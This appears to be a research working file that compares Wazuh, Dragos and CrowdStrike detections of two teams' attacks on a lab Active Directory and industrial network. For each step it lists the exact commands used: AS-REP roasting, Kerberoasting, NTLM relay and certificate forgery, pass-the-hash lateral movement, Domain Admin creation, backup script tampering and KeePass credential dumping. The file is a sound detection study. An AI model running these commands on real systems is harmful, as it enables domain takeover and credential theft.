# TODO

- remake all log snippets in Reasoning due to timezone variations
- overhaul all TTPs to reflect newly added techniques in comparison with volt typhoon
  - team6 wazuh done

get all wazuh logs quick and powershelley:
```
$data = gc ..\..\..\wazuh_merged\team9_run2.json | convertfrom-json
$data | select timestamp,{$_.agent.name},{$_.rule.level},{$_.rule.description},{$_.data.win.eventdata.targetusername},{$_.full_log},{$_.data.win.system.message} | export-csv .\csv\df_wz_result_team9_run3.csv -Delimiter ';' -NoTypeInformation
```

# Discussion

- differences in run1 and run2 due to increased stealth
  - team2 run1 dragos row 52 kerberoasting suspected due to LDAP query, nothing in run2
  - why team9 add group membership Low and not High? -> they added a user to Server Admins, not Domain Admins as requested ...

# Wazuh

## team6

| ID  | Featured attack/vulnerability | technique(s) | tool(s) and command(s) | eval | Reasoning |
|-----|-------------------------------|--------------|------------------------|------|-----------|
| N/A | Preparing exploits and tools | Obtain Capabilities: Exploits - T1588.005 | `hashcat, impacket, certipy-ad, evil-winrm` | N/A | |
| N/A | Entering VPN with valid credentials | External Remote Services - T1133<br>Valid Accounts - T1078 | N/A | N/A | Out of scope |
| N/A | N/A | Network Service Discovery - T1046<br>Remote System Discovery - T1018 | `nmap` | None<br>None | Likely discovery was not performed during subsequent resets of the infrastructure | 
| AV3 | Gather employee names from website | Search Victim-Owned Websites - T1594<br>Gather Victim Identity Information: Email Addresses - T1589.002 | Web Browser | N/A<br>N/A | No detection in place/possible |
| AV3 | AS-REP roast users using username list | Steal or Forge Kerberos Tickets: AS-REP Roasting - T1558.004 | `impacket-GetNPUsers -usersfile users.txt -request -format hashcat -outputfile ASREProastables.txt -dc-ip 10.0.6.11 'plumetech/'` | None | Unclear why no detection triggered |
| AV2 | Offline cracking captured AS-REP hashes | Brute Force: Password Cracking - T1110.002 | `hashcat -m 18200 ASREProastables.txt rockyou.txt` | N/A | No detection in place/possible |
| N/A | Discover Domain User SID | Command and Scripting Interpreter: PowerShell - T1059.001<br>Account Discovery: Domain Account - T1087.002<br>Permission Groups Discovery - T1069 | `Get-ADUser manuel` | None<br>None<br>None | No detection in place<br>Remark: Command to identify group membership from account `manuel` is missing from writeup |
| N/A | Request certificate with alternate UPN | Valid Accounts - T1078<br>Steal or Forge Authentication Certificates - T1649 | `certipy-ad req -dc-ip 10.0.6.11 -u debbie@PLUMETECH.LOCAL -p '25800ellie' -template Smartcard -upn manuel@PLUMETECH.LOCAL -ca PLUMETECH-DC1-CA -target DC1.PLUMETECH.LOCAL -sid "S-1-5-21-514844351-3181471642-2638765006-1103"`<br>`certipy-ad auth -pfx manuel.pfx -dc-ip 10.0.6.11` | None<br>None | Detection did not trigger since only SID mismatch is logged |
| N/A | Move laterally using WinRM | Valid Accounts - T1078<br>Use Alternate Authentication Material: Pass-the-Hash - T1550.002<br>Remote Services: Windows Remote Management - T1021.006<br> | `evil-winrm -i 10.0.6.11 -u manuel -H XXXXXXXX` | Technique/L<br>Technique/L<None> | `6 03/28/2025 15:14:28 Successful Remote Logon Detected - User:\manuel - NTLM authentication, possible pass-the-hash attack.` |
| FLAG1 | Create Domain Admin user | Create Account: Domain Account - T1136.002<br>Account Manipulation: Additional Local or Domain Groups - T1098.007 | `New-AdUser -Name 'plumber'` <br> `Add-ADGroupMember -Identity 'Domain Admins' -Members 'plumber'` <br> `Set-ADAccountPassword -Identity 'plumber' -NewPassword (ConvertTo-SecureString -AsPlainText "XXXXXXXX" -Force) -Reset` <br> `Enable-AdAccount -Identity plumber` | None<br>Technique/H | `12 03/28/2025 15:14:58 Domain Admins Group Changed` |


## team2

| ID  | Featured attack/vulnerability | technique(s) | tool(s) and command(s) | eval | Reasoning |
|-----|-------------------------------|--------------|------------------------|------|-----------|
| N/A | Preparing exploits and tools | Obtain Capabilities: Exploits - T1588.005 | `nxc, nmap, impacket, proxychains4, smbclient, hashcat, certipy-ad, susinternals` | N/A | |
| N/A | Entering VPN with valid credentials | External Remote Services - T1133<br>Valid Accounts - T1078 | N/A | N/A | Out of scope |
| N/A | Lack of SMB Signing | T1046 - Network Service Discovery | `nxc smb 10.0.2.0/24 --gen-relay-list list.txt` | None | No detection in place |
| N/A | N/A | T1018 - Remote System Discovery | `nmap` | None | Likely discovery was not performed during subsequent resets of the infrastructure |
| AV2 | Relaying SMB/NTLM authentication to certificate authority (ESC8) | T1557.001 - Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay | `impacket-ntlmrelayx -t 10.0.2.12 -smb2support -socks` | Technique | `3 03/28/2025 14:55:26 NTLM Challenge from 10.0.2.11 to 10.0.2.30`<br>`16 03/28/2025 14:55:26 Certain NTLM relaying from 10.0.2.29 to 10.0.2.30` |
| N/A | Discover Domain User SID | T1087.002 - Account Discovery: Domain Account | `proxychains4 impacket-lookupsid -no-pass -domain-sids PLUMETECH/JULIAN@10.0.2.12` | None | No detection in place |
| AV4 | Searching file shares for documents of interest | T1039 - Data from Network Shared Drive | `proxychains4 smbclient -L //10.0.2.12/ -U PLUMETECH/julian`<br>`proxychains4 smbclient //10.0.2.12/IT -U PLUMETECH/julian` | None | Participants did not trigger the honey file in subsequent resets | 
| AV3 | AS-REP roast users using username list | T1558.004 - Steal or Forge Kerberos Tickets: AS-REP Roasting | `nxc ldap 10.0.2.11 -d PLUMETECH -u debbie -p '' --asreproast output.txt` | None | Unclear why detections did not trigger, probably because of tooling (nxc) |
| AV2 | Offline cracking captured AS-REP hashes | T1110.002 - Brute Force: Password Cracking | `hashcat -m 18200 -a 0 -O debbie.txt rockyou.txt` | N/A | N/A |
| AV7 | User accounts with SPN set | T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting<br>T1078.002 - Valid Accounts: Domain Accounts | `nxc ldap 10.0.2.11 -d PLUMETECH -u debbie -p 'XXXXXXXX' --kerberoasting krb.txt` | Technique<br>Technique | `6 03/28/2025 15:09:41 Successful Remote Logon Detected - User:\debbie - NTLM authentication, possible pass-the-hash attack.`<br>`16 03/28/2025 15:09:41 Honey Token Service Account Ticket requested from ::ffff:10.0.2.30 with 0x17 and 0x40810010 for User debbie@PLUMETECH.LOCAL`<br>`16 03/28/2025 15:09:41 Certain Kerberoasting attack - Multiple RC4 encrypted TGS issued in 1s` |
| N/A | Discover Domain User Description | T1087.002 - Account Discovery: Domain Account<br>T1078.002 - Valid Accounts: Domain Accounts | `nxc ldap 10.0.2.11 -d PLUMETECH -u calvin -p 'XXXXXXXX' -M get-desc-users` | None<br>Technique | No detection in place for Account Discovery<br>`28.03.2025 16:14	DC1	low	6	Successful Remote Logon Detected - User:\calvin - NTLM authentication, possible pass-the-hash attack.` |
| N/A | Request certificate with alternate UPN | T1649 - Steal or Forge Authentication Certificates<br>T1078.002 - Valid Accounts: Domain Accounts | `certipy-ad find -u calvin -p XXXXXXXX -dc-ip 10.0.2.11`<br>`certipy-ad req -target-ip 10.0.2.11 -upn "marla@plumetech.local" -u calvin@plumetech.local -p XXXXXXXX -template "Smartcard" -ca PLUMETECH-DC1-CA -sid "S-1-5-21-514844351-3181471642-2638765006-1116"`<br>`certipy-ad auth -pfx marla.pfx -dc-ip 10.0.2.11 -domain PLUMETECH.LOCAL` | None<br>Technique | Detection did not trigger since only SID mismatch is logged<br>`28.03.2025 16:18	DC1	low	6	Successful Remote Logon Detected - User:\calvin - NTLM authentication, possible pass-the-hash attack.` |
| N/A | Move laterally using psexec-like tool | T1021.002 - Remote Services: SMB/Windows Admin Shares<br>T1550.002 - Use Alternate Authentication Material: Pass the Hash | `git clone https://github.com/sensepost/susinternals`<br>`cd susinternals`<br>`python3 psexecsvc.py PLUMETECH/marla@10.0.2.11 -hashes XXXXXXXX:XXXXXXXX -system` | Technique<br>Technique | `3 03/28/2025 15:19:28 Evidence of new service creation found in registry under HKLM\\(...)\\PSEXESVC\\ImagePath binary is: %%systemroot%%\\PSEXECSVC.exe`<br>`7 03/28/2025 15:19:29 Medium Suricata Alert: ET INFO SMB Executable File Transfer`<br>`3 03/28/2025 15:19:29 Informational Suricata Alert: ET INFO PsExec service created`<br>`16 03/28/2025 15:19:29 Critical Suricata Alert: Stamus Networks MS-SCMR service - RCreateServiceW`<br>`13 03/28/2025 15:19:29 High Suricata Alert: ET INFO Command Shell Activity Over SMB - Possible Lateral Movement`<br>`28.03.2025 16:19	DC1	low	6	Successful Remote Logon Detected - User:\marla - NTLM authentication, possible pass-the-hash attack.` |
| FLAG1 | Create Domain Admin user | T1136.002 - Create Account: Domain Account<br>T1098.007 - Account Manipulation: Additional Local or Domain Groups<br>Command and Scripting Interpreter: Windows Command Shell - T1059.003 | `net user plumber XXXXXXXX /domain /add & net group "Domain Admins" plumber /add & net user fernando XXXXXXXX /domain` | None<br>Technique<br>None | `12 03/28/2025 15:20:32 Domain Admins Group Changed` |
| AV11 | Lateral Movement to Jump Host (JUMP) using RDP | T1021.004 - Remote Services: SSH<br>T1078.002 - Valid Accounts: Domain Accounts<br>T1021.001 - Remote Services: Remote Desktop Protocol | `ssh -L 3390:10.0.2.44:3389 -p2022 kali@cup.stealth.ait.ac.at -i C:\Users\hacker\Downloads\ssh_key.pem`<br>`mstsc.exe` | None<br>Technique<br>Technique | `6 03/28/2025 15:26:32 Successful Remote Logon Detected - User:\fernando - NTLM authentication, possible pass-the-hash attack - Possible RDP connection. Verify that ARCHLINUX is allowed to perform RDP connections`<br>`3 03/28/2025 15:26:51 User: PLUMETECH-OT\fernando logged using Remote Desktop Connection (RDP) from ip:10.0.2.30.` |
| AV13 | Tampering of Backup Script | T1053.005 - Scheduled Task/Job: Scheduled Task | added `net user Administrator XXXXXXXX` to `Backup.ps1` | Technique | `9 03/28/2025 15:28:43 Backup Job altered` |
| AV15 | Exploiting CVE-2023-32784 in KeePass.exe |  T1057 - Process Discovery<br>T1010 - Application Window Discovery<br>T1087.001 - Account Discovery: Local Account<br>T1555.005 - Credentials from Password Stores: Password Managers | Dump KeePass.exe using `taskmgr.exe`<br>`.\keepass-dump-extractor.exe .\KeePass.DMP` | None<br>None<br>None<br>Technique | `15 03/28/2025 15:31:30 KeePass.exe accessed` |
| AV21 | Lateral Movement to the Engineering Workstation (ENG) | T1078.002 - Valid Accounts: Domain Accounts<br>T1021.001 - Remote Services: Remote Desktop Protocol | `mstsc.exe` | Technique<br>Technique | `6 03/28/2025 15:36:35 Successful Remote Logon Detected - User:\Administrator - NTLM authentication, possible pass-the-hash attack - Possible RDP connection. Verify that JUMP is allowed to perform RDP connections` |
| AV27 | PLC IDE Access on the Engineering Workstation | T1078.002 - Valid Accounts: Domain Accounts<br>T1039 - Data from Network Shared Drive | PLCNext | None<br>None | No detection in place |
| AV28<br>FLAG2 | Modification of Program Logic | T0836 - Modify Parameter | PLCNext | None | Detection only triggers on direct access to PLC on port 420 |

# Dragos

## team6

| ID  | Featured attack/vulnerability | technique(s) | tool(s) and command(s) | eval | Reasoning |
|-----|-------------------------------|--------------|------------------------|------|-----------|
| N/A | N/A | T1018 - Remote System Discovery | `nmap` | None | Likely discovery was not performed during subsequent resets of the infrastructure | 
| AV3 | Gather employee names from website | T1593 - Search Open Websites/Domains | Web Browser | N/A |  |
| AV3 | AS-REP roast users using username list | T1558.004 - Steal or Forge Kerberos Tickets: AS-REP Roasting | `impacket-GetNPUsers -usersfile users.txt -request -format hashcat -outputfile ASREProastables.txt -dc-ip 10.0.6.11 'plumetech/'` | None |  |
| AV2 | Offline cracking captured AS-REP hashes | T1110.002 - Brute Force: Password Cracking | `hashcat -m 18200 ASREProastables.txt rockyou.txt` | N/A | No detection in place/possible |
| N/A | Discover Domain User SID | T1087.002 - Account Discovery: Domain Account | `Get-ADUser manuel` | None |  |
| N/A | Request certificate with alternate UPN | T1649 - Steal or Forge Authentication Certificates<br>T1078.002 - Valid Accounts: Domain Accounts | `certipy-ad req -dc-ip 10.0.6.11 -u debbie@PLUMETECH.LOCAL -p '25800ellie' -template Smartcard -upn manuel@PLUMETECH.LOCAL -ca PLUMETECH-DC1-CA -target DC1.PLUMETECH.LOCAL -sid "S-1-5-21-514844351-3181471642-2638765006-1103"`<br>`certipy-ad auth -pfx manuel.pfx -dc-ip 10.0.6.11` | None<br>None |  |
| N/A | Move laterally using WinRM | T1021.006 - Remote Services: Windows Remote Management<br>T1550.002 - Use Alternate Authentication Material: Pass the Hash | `evil-winrm -i 10.0.6.11 -u manuel -H XXXXXXXX` | Technique<br>None | `Medium 2025-03-28T15:14:28Z Evil-WinRM User Agent` |
| FLAG1 | Create Domain Admin user | T1136.002 - Create Account: Domain Account | `New-AdUser -Name 'plumber'` <br> `Add-ADGroupMember -Identity 'Domain Admins' -Members 'plumber'` <br> `Set-ADAccountPassword -Identity 'plumber' -NewPassword (ConvertTo-SecureString -AsPlainText "XXXXXXXX" -Force) -Reset` <br> `Enable-AdAccount -Identity plumber` | None |  |


## team2

| ID  | Featured attack/vulnerability | technique(s) | tool(s) and command(s) | eval | Reasoning |
|-----|-------------------------------|--------------|------------------------|------|-----------|
| N/A | Lack of SMB Signing | T1046 - Network Service Discovery | `nxc smb 10.0.2.0/24 --gen-relay-list list.txt` | None |  |
| N/A | N/A | T1018 - Remote System Discovery | `nmap` | None |  |
| AV2 | Relaying SMB/NTLM authentication to certificate authority (ESC8) | T1557.001 - Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay | `impacket-ntlmrelayx -t 10.0.2.12 -smb2support -socks` | None |  |
| N/A | Discover Domain User SID | T1557.001 - Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay<br>T1087.002 - Account Discovery: Domain Account | `proxychains4 impacket-lookupsid -no-pass -domain-sids PLUMETECH/JULIAN@10.0.2.12`<br> `Get-ADUser manuel` | None<br>None |  |
| AV4 | Searching file shares for documents of interest | T1557.001 - Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay<br>T1039 - Data from Network Shared Drive | `proxychains4 smbclient -L //10.0.2.12/ -U PLUMETECH/julian`<br>`proxychains4 smbclient //10.0.2.12/IT -U PLUMETECH/julian` | None<br>None |  | 
| AV3 | AS-REP roast users using username list | T1558.004 - Steal or Forge Kerberos Tickets: AS-REP Roasting | `nxc ldap 10.0.2.11 -d PLUMETECH -u debbie -p '' --asreproast output.txt` | None |  |
| AV2 | Offline cracking captured AS-REP hashes | T1110.002 - Brute Force: Password Cracking | `hashcat -m 18200 -a 0 -O debbie.txt rockyou.txt` | N/A | N/A |
| AV7 | User accounts with SPN set | T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting<br>T1078.002 - Valid Accounts: Domain Accounts | `nxc ldap 10.0.2.11 -d PLUMETECH -u debbie -p 'XXXXXXXX' --kerberoasting krb.txt` | None<br>None |  |
| N/A | Discover Domain User Description | T1087.002 - Account Discovery: Domain Account<br>T1078.002 - Valid Accounts: Domain Accounts | `nxc ldap 10.0.2.11 -d PLUMETECH -u calvin -p 'XXXXXXXX' -M get-desc-users` | None<br>None |  |
| N/A | Request certificate with alternate UPN | T1649 - Steal or Forge Authentication Certificates<br>T1078.002 - Valid Accounts: Domain Accounts | `certipy-ad find -u calvin -p XXXXXXXX -dc-ip 10.0.2.11`<br>`certipy-ad req -target-ip 10.0.2.11 -upn "marla@plumetech.local" -u calvin@plumetech.local -p XXXXXXXX -template "Smartcard" -ca PLUMETECH-DC1-CA -sid "S-1-5-21-514844351-3181471642-2638765006-1116"`<br>`certipy-ad auth -pfx marla.pfx -dc-ip 10.0.2.11 -domain PLUMETECH.LOCAL` | None<br>None |  |
| N/A | Move laterally using psexec-like tool | T1021.002 - Remote Services: SMB/Windows Admin Shares<br>T1550.002 - Use Alternate Authentication Material: Pass the Hash | `git clone https://github.com/sensepost/susinternals`<br>`cd susinternals`<br>`python3 psexecsvc.py PLUMETECH/marla@10.0.2.11 -hashes XXXXXXXX:XXXXXXXX -system` | Technique<br>None | `Medium	37922	2025-03-28T15:19:26Z	Indicator	Threat Behavior	SMB Executable Extension .exe	SMB Executable Extension .exe	SMB File Transfers`<br>`Medium	37923	2025-03-28T15:19:26Z	Indicator	Indicator	PsExec Service Created	PsExec Service Created	PsExec Signatures`<br>`Low	37924	2025-03-28T15:19:27Z	Indicator	Threat Behavior	SMB2 Command Shell Activity cmd.exe	SMB2 Command Shell Activity cmd.exe	SMB Windows Command Shell`<br>`Low	38672	2025-03-28T15:22:10Z	Communication	Threat Behavior	SMB File Open	An SMB FILE_OPEN action was seen on Asset 48 (10.0.2.11) from Asset 154 (10.0.2.30) . The script executed the following action ['SMB::FILE_OPEN', 'SMB::FILE_OVERWRITE_IF'] .	SMB File Open` |
| FLAG1 | Create Domain Admin user | T1136.002 - Create Account: Domain Account | `net user plumber XXXXXXXX /domain /add & net group "Domain Admins" plumber /add & net user fernando XXXXXXXX /domain` | None |  |
| AV11 | Lateral Movement to Jump Host (JUMP) using RDP | T1021.004 - Remote Services: SSH<br>T1078.002 - Valid Accounts: Domain Accounts<br>T1021.001 - Remote Services: Remote Desktop Protocol | `ssh -L 3390:10.0.2.44:3389 -p2022 kali@cup.stealth.ait.ac.at -i C:\Users\hacker\Downloads\ssh_key.pem`<br>`mstsc.exe` | Technique<br>Technique<br>Technique | `Low	32708	28.03.2025 11:28	Communication	Configuration	RDP New Cookie	New RDP cookie plumber from host 10.0.2.11 (asset 48) to host 10.0.2.30 (asset 154).`<br>`Low,38970,2025-03-28T15:31:07Z,Communication,Threat Behavior,Interactive Session Pivot,Asset 2896 (10.0.242.127) connected via SSH to asset 154 (10.0.2.30) to then pivot to asset 143 (10.0.2.44) via RDP.,Interactive Session Pivots,"2896,143",,,10.0.242.127,10.0.2.44,,,` |
| AV13 | Tampering of Backup Script | T1053.005 - Scheduled Task/Job: Scheduled Task | added `net user Administrator XXXXXXXX` to `Backup.ps1` | None | |
| AV15 | Exploiting CVE-2023-32784 in KeePass.exe | T1555.005 - Credentials from Password Stores: Password Managers | Dump KeePass.exe using `taskmgr.exe`<br>`.\keepass-dump-extractor.exe .\KeePass.DMP` | None |  |
| AV21 | Lateral Movement to the Engineering Workstation (ENG) | T1078.002 - Valid Accounts: Domain Accounts<br>T1021.001 - Remote Services: Remote Desktop Protocol | `mstsc.exe` | None<br>Technique | `Low,38966,2025-03-28T15:33:56Z,Communication,Threat Behavior,Interactive Session Pivot,Asset 154 (10.0.2.30) connected via RDP to asset 143 (10.0.2.44) to then pivot to asset 142 (10.0.2.59) via RDP.,Interactive Session Pivots,"154,142",,,10.0.2.30,10.0.2.59,,,` |
| AV27 | PLC IDE Access on the Engineering Workstation | T1078.002 - Valid Accounts: Domain Accounts<br>T1039 - Data from Network Shared Drive | PLCNext | None<br>None | |
| AV28<br>FLAG2 | Modification of Program Logic | T0836 - Modify Parameter | PLCNext | None | Detection only triggers on direct access to PLC on port 420 |

# Crowdstrike

## team6

| ID  | Featured attack/vulnerability | technique(s) | tool(s) and command(s) | eval | Reasoning |
|-----|-------------------------------|--------------|------------------------|------|-----------|
| N/A | N/A | T1018 - Remote System Discovery | `nmap` | None | Likely discovery was not performed during subsequent resets of the infrastructure | 
| AV3 | Gather employee names from website | T1593 - Search Open Websites/Domains | Web Browser | N/A |  |
| AV3 | AS-REP roast users using username list | T1558.004 - Steal or Forge Kerberos Tickets: AS-REP Roasting | `impacket-GetNPUsers -usersfile users.txt -request -format hashcat -outputfile ASREProastables.txt -dc-ip 10.0.6.11 'plumetech/'` | None |  |
| AV2 | Offline cracking captured AS-REP hashes | T1110.002 - Brute Force: Password Cracking | `hashcat -m 18200 ASREProastables.txt rockyou.txt` | N/A |  |
| N/A | Discover Domain User SID | T1087.002 - Account Discovery: Domain Account | `Get-ADUser manuel` | None |  |
| N/A | Request certificate with alternate UPN | T1649 - Steal or Forge Authentication Certificates<br>T1078.002 - Valid Accounts: Domain Accounts | `certipy-ad req -dc-ip 10.0.6.11 -u debbie@PLUMETECH.LOCAL -p '25800ellie' -template Smartcard -upn manuel@PLUMETECH.LOCAL -ca PLUMETECH-DC1-CA -target DC1.PLUMETECH.LOCAL -sid "S-1-5-21-514844351-3181471642-2638765006-1103"`<br>`certipy-ad auth -pfx manuel.pfx -dc-ip 10.0.6.11` | Technique<br>Technique | `Anomalous certificate-based authentication (user mismatch)IDPEvent` |
| N/A | Move laterally using WinRM | T1021.006 - Remote Services: Windows Remote Management<br>T1550.002 - Use Alternate Authentication Material: Pass the Hash | `evil-winrm -i 10.0.6.11 -u manuel -H XXXXXXXX` | None<br>None |  |
| FLAG1 | Create Domain Admin user | T1136.002 - Create Account: Domain Account | `New-AdUser -Name 'plumber'` <br> `Add-ADGroupMember -Identity 'Domain Admins' -Members 'plumber'` <br> `Set-ADAccountPassword -Identity 'plumber' -NewPassword (ConvertTo-SecureString -AsPlainText "XXXXXXXX" -Force) -Reset` <br> `Enable-AdAccount -Identity plumber` | None |  |


## team2

| ID  | Featured attack/vulnerability | technique(s) | tool(s) and command(s) | eval | Reasoning |
|-----|-------------------------------|--------------|------------------------|------|-----------|
| N/A | Lack of SMB Signing | T1046 - Network Service Discovery | `nxc smb 10.0.2.0/24 --gen-relay-list list.txt` | None |  |
| N/A | N/A | T1018 - Remote System Discovery | `nmap` | None |  |
| AV2 | Relaying SMB/NTLM authentication to certificate authority (ESC8) | T1557.001 - Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay | `impacket-ntlmrelayx -t 10.0.2.12 -smb2support -socks` | None |  |
| N/A | Discover Domain User SID | T1557.001 - Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay<br>T1087.002 - Account Discovery: Domain Account | `proxychains4 impacket-lookupsid -no-pass -domain-sids PLUMETECH/JULIAN@10.0.2.12`<br> `Get-ADUser manuel` | None<br>None |  |
| AV4 | Searching file shares for documents of interest | T1557.001 - Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay<br>T1039 - Data from Network Shared Drive | `proxychains4 smbclient -L //10.0.2.12/ -U PLUMETECH/julian`<br>`proxychains4 smbclient //10.0.2.12/IT -U PLUMETECH/julian` | None<br>None |  | 
| AV3 | AS-REP roast users using username list | T1558.004 - Steal or Forge Kerberos Tickets: AS-REP Roasting | `nxc ldap 10.0.2.11 -d PLUMETECH -u debbie -p '' --asreproast output.txt` | None |  |
| AV2 | Offline cracking captured AS-REP hashes | T1110.002 - Brute Force: Password Cracking | `hashcat -m 18200 -a 0 -O debbie.txt rockyou.txt` | N/A | N/A |
| AV7 | User accounts with SPN set | T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting<br>T1078.002 - Valid Accounts: Domain Accounts | `nxc ldap 10.0.2.11 -d PLUMETECH -u debbie -p 'XXXXXXXX' --kerberoasting krb.txt` | Technique<br>Technique | `Suspicious LDAP search (Kerberos misconfiguration)IDPEvent`<br>`"A user executed a suspicious LDAP search looking for Kerberos misconfigurations`<br>`"threat.technique.id[0]":"T1558","threat.technique.name[0]":"Steal or Forge Kerberos Tickets"`<br>`"UserName\":\"debbie@PLUMETECH.LOCAL\` |
| N/A | Discover Domain User Description | T1087.002 - Account Discovery: Domain Account<br>T1078.002 - Valid Accounts: Domain Accounts | `nxc ldap 10.0.2.11 -d PLUMETECH -u calvin -p 'XXXXXXXX' -M get-desc-users` | None<br>None |  |
| N/A | Request certificate with alternate UPN | T1649 - Steal or Forge Authentication Certificates<br>T1078.002 - Valid Accounts: Domain Accounts | `certipy-ad find -u calvin -p XXXXXXXX -dc-ip 10.0.2.11`<br>`certipy-ad req -target-ip 10.0.2.11 -upn "marla@plumetech.local" -u calvin@plumetech.local -p XXXXXXXX -template "Smartcard" -ca PLUMETECH-DC1-CA -sid "S-1-5-21-514844351-3181471642-2638765006-1116"`<br>`certipy-ad auth -pfx marla.pfx -dc-ip 10.0.2.11 -domain PLUMETECH.LOCAL` | Technique<br>Technique | `Suspicious LDAP search (AD-CS reconnaissance)`<br>`threat.technique.id[0]":"T1046","threat.technique.name[0]":"Network Service Discovery"`<br>`A lower-privileged entity performed an unusual Kerberos certificate-based authentication to a higher-privileged entity, which might indicate a malicious activity`<br>`"threat.technique.id[0]":"T1649","threat.technique.name[0]":"Steal or Forge Authentication Certificates"`<br>`username\":\"calvin@PLUMETECH.LOCAL\"` |
| N/A | Move laterally using psexec-like tool | T1021.002 - Remote Services: SMB/Windows Admin Shares<br>T1550.002 - Use Alternate Authentication Material: Pass the Hash | `git clone https://github.com/sensepost/susinternals`<br>`cd susinternals`<br>`python3 psexecsvc.py PLUMETECH/marla@10.0.2.11 -hashes XXXXXXXX:XXXXXXXX -system` | None<br>None |  |
| FLAG1 | Create Domain Admin user | T1136.002 - Create Account: Domain Account | `net user plumber XXXXXXXX /domain /add & net group "Domain Admins" plumber /add & net user fernando XXXXXXXX /domain` | Technique | `"A user received new privileges`<br>`threat.tactic.name[0]":"Privilege Escalation","threat.technique.id[0]":"T1078","threat.technique.name[0]":"Valid Accounts"`  |
| AV11 | Lateral Movement to Jump Host (JUMP) using RDP | T1021.004 - Remote Services: SSH<br>T1078.002 - Valid Accounts: Domain Accounts<br>T1021.001 - Remote Services: Remote Desktop Protocol | `ssh -L 3390:10.0.2.44:3389 -p2022 kali@cup.stealth.ait.ac.at -i C:\Users\hacker\Downloads\ssh_key.pem`<br>`mstsc.exe` | None<br>None<br>None | |
| AV13 | Tampering of Backup Script | T1053.005 - Scheduled Task/Job: Scheduled Task | added `net user Administrator XXXXXXXX` to `Backup.ps1` | None | |
| AV15 | Exploiting CVE-2023-32784 in KeePass.exe | T1555.005 - Credentials from Password Stores: Password Managers | Dump KeePass.exe using `taskmgr.exe`<br>`.\keepass-dump-extractor.exe .\KeePass.DMP` | General | ` A process appears to be accessing credentials and might be dumping passwords. If this is unexpected, review the process tree.`<br>`tactic: Credential Access; tactic_id: TA0006; technique: OS Credential Dumping; technique_id: T1003` |
| AV21 | Lateral Movement to the Engineering Workstation (ENG) | T1078.002 - Valid Accounts: Domain Accounts<br>T1021.001 - Remote Services: Remote Desktop Protocol | `mstsc.exe` | None<br>None |  |
| AV27 | PLC IDE Access on the Engineering Workstation | T1078.002 - Valid Accounts: Domain Accounts<br>T1039 - Data from Network Shared Drive | PLCNext | None<br>None | |
| AV28<br>FLAG2 | Modification of Program Logic | T0836 - Modify Parameter | PLCNext | None | Detection only triggers on direct access to PLC on port 420 |





